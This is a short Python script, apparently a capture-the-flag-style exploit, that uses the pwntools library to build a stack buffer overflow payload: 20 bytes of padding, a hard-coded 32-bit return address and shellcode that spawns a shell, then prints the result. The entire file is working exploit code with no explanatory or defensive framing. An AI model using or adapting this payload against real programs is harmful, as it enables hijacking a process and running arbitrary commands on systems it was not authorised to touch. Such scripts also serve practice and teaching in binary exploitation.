from pwn import *

payload = b"\x41" * 20
shellcode = asm(shellcraft.sh())
return_addr = p32(0x804809d)
payload += return_addr
payload += shellcode
print(payload)
